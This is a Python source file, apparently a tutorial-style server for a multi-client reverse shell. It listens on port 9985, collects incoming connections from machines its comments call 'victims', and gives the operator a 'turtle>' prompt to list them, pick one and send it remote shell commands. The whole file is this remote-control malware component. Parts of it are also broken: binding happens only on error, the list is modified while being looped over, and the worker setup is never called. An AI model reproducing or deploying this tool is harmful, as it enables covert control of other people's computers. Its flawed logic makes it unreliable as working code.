import socket
import sys
import threading
from queue import Queue

# how many workers we have
# here we have two workers
Number_Of_Thread=2

#How many jobs we have to do
#here we have two jobs  to do
Jobs=[1,2]

#piece of paper to write down our jobs
#this is to-do-list
queue=Queue()
all_connections=[]#here we are storing all connections/roads/bridges between me and my victim
all_address=[]#here we are storing all address of my victims/ ports and  host numbers of my victims


def create_socket():
    try:
        global  host
        global port
        global s
        host=''
        s=socket.socket()
        port=9985

    except socket.error as msg:
        print("Cannot create socket:" + str(msg))
        bind_socket()



def bind_socket():
    try:

        print('Binding sockets to port:'+str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print('Cannot bind socket'+str(msg))




#Accept connections from multiple clients
def Accept_Conn():
    #first of all we must close all of existing connections
    for c  in all_connections:
        c.close()
    #delete all informations both from connecitons list and address list
    del all_connections[:]
    del all_address[:]
    #when any connections/informations are closed and deleted we can  start
    #checking  our new connections and add them to the lists
    while 1:
        try:
            conn,address=s.accept()
            #no time out between checking
            conn.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)
            print('I got connection with IP addres:'+ str(address[0]) + 'via port:'+ str(address[1]))
            start_turtle()
        except socket.error as msg:
            print('Cannot  accepts request'+ str(msg ))


#all stuff is taking place on my computer
#in order to help me make decision to where i want to send data
def start_turtle():
    while True:
        #our prompt will start with turtle instead of user path
        cmd=input('turtle>')
        if cmd=='list':
            list_connections()
            continue
        elif 'select' in cmd:
            response=get_target(cmd)
            if response is not None:
                send_command(response)
        else:
            print("Wrong command")


def list_connections():
    result=''
    for i,conn in  enumerate(all_connections):
        try:
            #we want to display to user only valid connections
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            #if connections is unvalid-remove it
            del all_connections[i]
            del all_address[i]
            continue
        result+=str(i)+ '   '+ str(all_address[i][0]) + '  ' + str(all_address[i][1])+'\n'
    print('-----Clients-----\n'+  result)



def get_target(cmd):
    try:
        target=cmd.replace('select ',' ')
        target=int(target)
        conn=all_connections[target]
        print('You chose connection with IP address :'+str(all_address[target][0]))
        return conn

    except:
        print('Cannot select connection')

#it takes place on victim computer
def send_command(response):
    while True:
        cmd=input()
        if cmd == 'quit':
            sys.exit()
        if len(str.encode(cmd)) > 0:
            response.send(str.encode(cmd))
            result=str(response.recv(1024))
            print(result)

#create workers to do our tasks
def create_workers():
    for _ in range(Number_Of_Thread):
        target=threading.Thread(target=work)
        target.daemon=True
        target.start()


def work():
    #read our to-do-list
    x=queue.get()
    #to do job no.1  we must call functions like ....
    if x==1:
        create_socket()
        bind_socket()
        Accept_Conn()
    #to do job no.2 we must call functions like ...
    if x==2:
        start_turtle()
    queue.task_done()



#create to-do-list
#write down all jobs on the piece of paper
#we have only two jobs to do so our list will be look like
# 1.  do this ....
# 2. do this ....
def jobs():
    for x in Jobs:
        queue.put(x)
    queue.join()






